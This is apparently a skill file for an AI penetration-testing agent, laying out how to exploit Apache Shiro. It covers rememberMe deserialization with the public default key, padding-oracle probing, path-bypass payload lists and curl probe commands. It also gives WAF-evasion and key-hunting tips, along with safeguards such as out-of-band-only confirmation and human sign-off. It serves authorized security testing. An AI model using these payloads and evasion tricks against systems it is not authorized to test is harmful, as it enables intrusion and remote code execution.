---
name: shiro
description: Apache Shiro Light Deep Card — Shiro-550 (AES-CBC) / 721 (Padding Oracle) / 路径绕过。Key 验证顺序 / Gadget 选择 / Bypass + Impact 升级链。
category: vuln
tags: [java, deser, middleware, shiro, auth-bypass]
---

# Apache Shiro — Light Deep Card

> **CWE**: 502 / 287 | **OWASP**: A02:2021 (加密失败) + A07:2021 (认证失败) | **ROI**: 极高 (P0 — RCE)
> **轻便原则**: 决策路径优先;大字典 / gadget 全表外置 (`ysoserial` / SecLists)。

---

## 1. First-pass Signal

| 信号 | 判断 | 下一步 |
| :--- | :--- | :--- |
| Cookie 含 `rememberMe` | Shiro 可能性高 | §3 Shiro-550 |
| 删除 Cookie 后自动写回 `rememberMe=deleteMe` | Shiro 几乎确认 | §3 |
| 伪造 rememberMe 后 500 | 反序列化/解密异常 | §3.2 |
| `/admin` Shiro 过滤链特征 | 路径绕过可能 | §5 |
| Response Header 含 `Set-Cookie: JSESSIONID` 不变 | Shiro 接管会话 | 持续观察 |

**禁止**: 一上来盲跑全 gadget / 全 key / 全路径字典。必须先记录 `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 2. Attack Surface

| 入口 | 检查点 |
| :--- | :--- |
| **登录页面** | 看 rememberMe checkbox / 自动 Set-Cookie |
| **后台管理 `/admin` `/manage`** | 看 Shiro 过滤链特征 |
| **API 网关后端** | Spring Boot + Shiro 组合常见 |
| **JSP 老站** | Shiro 应用最多在 JSP/Servlet |
| **微服务认证层** | Shiro + JWT 混合 |
| **多语言企业应用** | OneAPM / Confluence / 内部 OA |

---

## 3. Shiro-550 (rememberMe AES-CBC 反序列化)

### 3.1 Key 验证顺序

1. 用少量高频 key 生成 **URLDNS** payload。
2. 只观察 OOB DNS 回调,**不直接** RCE。
3. DNS 回调成功 → 记录 key 命中 → 再选择 gadget。
4. DNS 不回调 → 不扩大 gadget,先换 OOB 通道 / 检查出站限制。

**高频 key 来源**:
- 默认 key: `kPH+bIxk5D2deZiIxcaaaA==`
- 项目泄露: `shiro.ini` / `application.yml` / `.properties` / JS / 备份文件
- GitHub 同公司项目搜索 (key 复用很常见)
- heap dump 中 `DefaultSecurityManager` 实例

### 3.2 关键证据

```markdown
- 指纹: Cookie rememberMe 存在 / deleteMe 回写
- Payload: URLDNS only
- OOB: <dnslog/interactsh 子域>
- 结果: DNS 回调 / 未回调
- HTTP: code=<code>, len_delta=<delta>, timing=<ms>
```

### 3.3 Gadget 选择

| 环境信号 | 优先 gadget |
| :--- | :--- |
| Java 8 + commons-collections 3.x | CC5 / CC6 |
| Java 8 + commons-collections 4.x | CC2 / CC11 |
| Spring 环境 | Spring1 / Spring2 |
| Tomcat | JRMP listener + CC |
| 无依赖信息 | 仅 URLDNS 证明存在,停手问用户是否升级 |
| 出站 DNS 被封 | 尝试 HTTP OOB;仍失败则不报 RCE,只报可疑 Shiro 反序列化 |

---

## 4. Shiro-721 (Padding Oracle)

**适用前提**: Shiro 版本存在 rememberMe 加密 padding oracle;不依赖默认 key,但请求量更高 (典型 5000+ 包/字节)。

### 4.1 决策路径

1. 确认 rememberMe 行为稳定。
2. 发送畸形 padding Cookie,观察 `500 / 302 / 200` 差异。
3. 若差异稳定 ≥3 次 → 标记 `[Padding_Oracle_Suspected]`。
4. 需要大量请求时先 HITL 确认测试窗口和速率限制 — **OPSEC 红线**。

**报告口径**: 未完成可控明文构造前,不要直接报 RCE;报 "Shiro rememberMe Padding Oracle 可疑/已确认" 并附差异证据。

---

## 5. Shiro 路径规范化绕过

适用于 Shiro filter chain 与前端网关/容器解析路径不一致。

### 5.1 First-pass Payload

```http
/admin/%2e
/admin/.
/admin;/
/admin..;/
/;/admin
/admin/%2f..%2fadmin
/admin%2F
/admin?xxx
/admin/index.jsp;.png
```

### 5.2 判断

| 现象 | 判断 |
| :--- | :--- |
| 原始 `/admin` = 302/401/403, 变体 = 200 | 可能绕过 |
| 变体进入登录后页面但功能 403 | 仅路由层绕过,影响较低 |
| 变体可调用管理 API | 高危 / BFLA |
| 变体返回不同的 redirect | 鉴权层不一致 |

---

## 6. Bypass Techniques

| 阻碍 | 绕过 |
| :--- | :--- |
| 默认 key 已改 | grep 项目源码 / heap dump / GitHub 同公司项目 |
| Gadget 不命中 | 用 ysoserial 生成各种 gadget 都试一遍 (CC1-11, Spring1-2, JRMP) |
| WAF 拦 rememberMe value 长度 | 用 gzip 压缩 gadget |
| 出站 DNS 被封 | HTTP/HTTPS OOB → ICMP 不太靠谱 |
| 服务侧只接受 GCM 模式 (新 Shiro) | 多半 ≥1.4.2,放弃 Shiro-550,转 721 / 路径绕过 |
| /admin 路径完全拦 | 走 §5 路径规范化绕过 |

---

## 7. Testing Methodology

```bash
# Step 1: 指纹确认
curl -I https://target/login | grep -i "Set-Cookie"
curl -b "rememberMe=test" https://target/ -I | grep -i "deleteMe"

# Step 2: URLDNS Probe (Shiro-550)
# 用工具生成 (shiro-tools / ysoserial)
java -jar shiro-tools.jar -t URLDNS -d "http://OOB.tld/probe" -k "kPH+bIxk5D2deZiIxcaaaA==" 
# 拿到 Cookie 后
curl -b "rememberMe=<payload>" https://target/
# 看 OOB 是否收到

# Step 3: Padding Oracle 探测 (Shiro-721)
# 发畸形 padding cookie 看 response code 差异
curl -b "rememberMe=AAAA..." https://target/

# Step 4: 路径绕过
for path in "%2e" "." ";" "..;/" ; do
  curl -s -o /dev/null -w "[$path] %{http_code}\n" "https://target/admin$path"
done
```

---

## 8. Triage

| 现象 | 可能原因 | 动作 |
| :--- | :--- | :--- |
| 100% 500 | key 错 / gadget 不兼容 / 反序列化 crash | 回到 URLDNS-only |
| 200 但无 OOB | 出站被封 / key 错 / GCM 模式 | 换 OOB / 查版本 |
| `deleteMe` 写回但无漏洞 | Shiro 指纹成立但版本已修 | 转路径绕过 / 认证逻辑 |
| 路径变体 200 但内容为空 | 网关返回默认页 | 对比响应长度与关键 DOM |
| URLDNS 命中但 RCE gadget 全失败 | 老 Shiro 但新 Java / 无 CC | 仅报"反序列化可控但 RCE 受限" |

---

## 9. False Positives

| 误报场景 | 真实判断 |
| :--- | :--- |
| `deleteMe` 写回但不可控 | 部分框架模仿 Shiro 行为 (有但少) — 测 URLDNS 即可分辨 |
| OOB 命中但 cookie 不变也命中 | 服务侧主动 DNS 查询,与 SSRF 无关 — 测同样 key 反复发,看是否一致 |
| Padding Oracle 差异稳定但找不到明文 | 可能是其他错误码偶然差异 — 算 5000+ 包大样本验证 |
| 路径绕过 200 | 可能只是 404 错误页返 200 — 看 body 是否真是 admin 内容 |

---

## 10. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| URLDNS 证明存在,无 gadget | 信息收集 + 反序列化可控 | High (公开版本号情况) |
| Shiro-550 + CC gadget | RCE | Critical |
| Shiro-721 + 完整明文构造 | 任意账号登录 (rememberMe 伪造) | Critical |
| 路径绕过 → 管理 API 可调用 | BFLA | High-Critical |
| 路径绕过 → 仅页面绕过 | 信息泄露 | Medium |
| Key 泄露 (但版本已修) | 报告 + 风险提示 | Medium |

**证据 (P3.5)**:
- RCE 验证用 OOB callback,**不要**直接写 webshell
- 拿到 `whoami` 输出脱敏报告即可
- Padding Oracle 大量包测试 → HITL 确认速率限制

---

## 11. Pro Tips

- **Key 找不到不要硬攻**: 国内常见 5-6 个默认 key + 项目里搜 grep — 找不到就退路径绕过
- **同公司项目 key 复用率极高**: GitHub 搜公司名 + `shiro` 关键字 / `cipherKey`
- **Shiro 与 Spring Security 混用**: 看是哪个的 filter chain 命中 — 有时 Spring Security 在前 Shiro 在后
- **路径绕过 ROI**: 比 550 更稳定 (不依赖 key) → 优先测
- **`/;/login` 变体**: 国内 SRC 实战命中率最高,Tomcat 默认开
- **国内 WAF**: 阿里云盾对 rememberMe 大体积值敏感 → gzip 压缩 + base64 拆分多 cookie
- **不要全跑 11 个 CC gadget**: 先 URLDNS 确认 key,再针对性试 (浪费时间 + 触发 WAF)
- **GCM 模式 (≥1.4.2)**: 几乎不可破,放弃 RCE 转其他类
- **JSESSIONID 不变 ≠ Shiro**: Tomcat 默认就有 JSESSIONID,要看 rememberMe 才确认
- **Shiro 与 JWT 混用**: 看接口请求是 cookie 还是 Authorization Bearer — 分别测

---

## 12. 工具升级线

**classic 版**:
- 综合工具: `shiro_tools.jar` / `ShiroAttack2` / `Shiro_exploit_GUI`
- Gadget 生成: `ysoserial.jar`
- OOB: `interactsh-client` / 自建 DNSLog

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多 key + URLDNS payload
- `mcp__yaklang__exec_codec` 处理 AES-CBC + base64 链
- `mcp__yaklang__query_oob_record` 自建 OOB
- `mcp__yaklang__ssa_compile language="java"` 拉 Shiro 配置中的 key (源码情况)

---

## 13. 相关参考

- OOB 基础设施: [../oob-infrastructure.md](../oob-infrastructure.md)
- 反序列化通用: [deserialize.md](deserialize.md)
- Fastjson/Jackson: [fastjson-jackson.md](fastjson-jackson.md)
- Spring 生态: [spring-vuln.md](spring-vuln.md) / [../frameworks/spring-boot.md](../frameworks/spring-boot.md)
- 级联策略: [../chained-logic-extended.md](../chained-logic-extended.md)
- 敏感信息利用 (key 泄露后): [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
